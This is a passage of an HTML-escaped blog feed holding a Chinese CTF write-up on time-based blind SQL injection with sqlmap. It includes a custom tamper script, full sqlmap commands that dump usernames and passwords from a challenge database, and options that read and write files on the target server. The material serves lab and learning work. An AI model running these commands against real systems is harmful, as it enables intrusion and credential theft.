+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sys&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;E:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;tools&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;sqlmap&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; lib.core.enums &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; PRIORITY
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; lib.core.common &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; singleTimeWarnMessage
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__priority__ &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; PRIORITY&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;LOW &lt;span style=&#34;color:#6272a4&#34;&gt;# 当前脚本调用优先等级&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;dependencies&lt;/span&gt;(): &lt;span style=&#34;color:#6272a4&#34;&gt;# 声明当前脚本适用/不适用的范围，可以为空。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    singleTimeWarnMessage(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;这是我的tamper提示&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;tamper&lt;/span&gt;(payload, &lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;kwargs): &lt;span style=&#34;color:#6272a4&#34;&gt;# 用于篡改Payload、以及请求头的主要函数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; or &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;payload&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%23&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; payload
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义，&lt;/p&gt;
+&lt;p&gt;priority定义脚本的优先级，用于有多个tamper脚本的情况，查看lib.core.enums里的PRIORITY类可以看到详细的定义级别：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;PRIORITY&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;object&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOWEST &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOWER &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOW &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NORMAL &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HIGH &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HIGHER &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HIGHEST &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dependencies函数声明该脚本适用/不适用的范围，可以为空；&lt;/p&gt;
+&lt;p&gt;刚才例子里使用的&lt;code&gt;singleTimeWarnMessage() &lt;/code&gt;用于在控制台中打印出警告信息：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;tamper是主要的函数，接受的参数为payload和**kwargs，其中payload就是所求。kwargs为相关httpheader，想插入或则修改header的时候可以用到。&lt;/p&gt;
+&lt;p&gt;如例，我的tamper里就可以这么前后一加（虽然在sqlmap里也有类似的指令），然后url变成&lt;code&gt;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=&lt;/code&gt;，再指定注入参数为path就可以了。&lt;/p&gt;
+&lt;p&gt;下面是要用到的注入命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;current&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;db &lt;span style=&#34;color:#6272a4&#34;&gt;#查看当前的数据库&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;technique T  &lt;span style=&#34;color:#6272a4&#34;&gt;#指定注入类型&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　B: Boolean&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;based blind SQL injection（布尔型注入）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　E: Error&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;based SQL injection（报错型注入）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　U: UNION query SQL injection（可联合查询注入）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　S: Stacked queries SQL injection（可多语句查询注入）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　T: Time&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;based blind SQL injection（基于时间延迟注入）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;v3  &lt;span style=&#34;color:#6272a4&#34;&gt;#输出详细度 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;、只显示python错误以及严重的信息。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;、同时显示基本信息和警告信息。（默认）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;、同时显示debug信息。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;3&lt;/span&gt;、同时显示注入的payload。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;4&lt;/span&gt;、同时显示HTTP请求。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;、同时显示HTTP响应头。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;6&lt;/span&gt;、同时显示HTTP响应页面。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;threads &lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;           &lt;span style=&#34;color:#6272a4&#34;&gt;#指定线程数(时间盲注不推荐开多线程)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;dbms&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;MySQL&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;#指定其数据库为mysql &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;time&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;sec &lt;span style=&#34;color:#6272a4&#34;&gt;#DBMS响应的延迟时间（默认为5秒）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;p     &lt;span style=&#34;color:#6272a4&#34;&gt;#可测试的参数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;fresh&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;queries     &lt;span style=&#34;color:#6272a4&#34;&gt;#刷新缓存&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;库名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path  --time-sec 4 --current-db
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/62725e58094754312955451b.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/62725e58094754312955451b.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;表名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path  --time-sec 4 -D ciscnfinal --tables
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6272607009475431295a3797.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6272607009475431295a3797.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;字段(sqlmap自动用了16进制的绕过)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users --columns
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;数据&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这里b2ff3D048fe0c0374fd7可耻的错了，刷新缓存之后是b2ff30048fe0c0374fd7，看来时间盲注还是错误率的hhh。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这里能发现，sqlmap每次盲注的最后都使用一个&lt;code&gt;非&lt;/code&gt;来确定时间盲注的判断是否成功，下面接上刷新缓存的命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump --fresh-queries
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成注入，可以登录了，结束。但是这里还有很多问题，比如level还没涉及到，比如知道误报之后怎么只刷新特定的缓存……&lt;/p&gt;
+&lt;p&gt;推荐一个SQLMAP进阶使用的博客：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://drops.xmd5.com/static/drops/tips-5254.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://drops.xmd5.com/static/drops/tips-5254.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;下面是一些好玩的注入命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;referer http:&lt;span style=&#34;color:#ff79c6&#34;&gt;//&lt;/span&gt;www&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;baidu&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;com   &lt;span style=&#34;color:#6272a4&#34;&gt;#伪造referer字段&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;is&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;dba    &lt;span style=&#34;color:#6272a4&#34;&gt;#判断当前用户是否有管理员权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;data&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;uname=admin&amp;amp;passwd=admin&amp;amp;submit=Submit&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#6272a4&#34;&gt;#抓取其post提交的数据填入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;file&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;read &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;c:/test.txt&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;#读取目标服务器C盘下的test.txt文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;file&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;write  test&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;txt  &lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;file&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;dest &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;e:/hack.txt&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#6272a4&#34;&gt;#将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;proxy&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;#指定代理&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;prefix&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;PREFIX     &lt;span style=&#34;color:#6272a4&#34;&gt;#注入payload字符串前缀&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;--&lt;/span&gt;suffix&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;SUFFIX     &lt;span style=&#34;color:#6272a4&#34;&gt;#注入payload字符串后缀&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用星号（*）来指定注入点&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python sqlmap.py -u &amp;#34;http://127.0.0.1/Less-20/?id=1&amp;#34; --cookie=&amp;#34;uname=admin*&amp;#34; --banner
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示：&lt;code&gt;custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;更多更全的命令可以参考下面博客：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/sectool/164608.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.freebuf.com/sectool/164608.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;或者官方文档……&lt;/p&gt;
+&lt;p&gt;ps：感觉根据实际环境来修改现有的工具进行利用才是最nice的！&lt;/p&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/whatday/article/details/62059263&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/whatday/article/details/62059263&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/235846&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.anquanke.com/post/id/235846&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>绕过禁用F12</title>
+        <link>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</link>
+        <pubDate>Sun, 05 Dec 2021 00:00:19 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</guid>
+        <description>&lt;p&gt;今天做题的时候，遇到了这个，一按F12，就弹出hacker&lt;/p&gt;
+&lt;p&gt;以前还真没遇见过，搜了一下，原来是js&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!&lt;/span&gt;DOCTYPE html PUBLIC &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;html xmlns&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
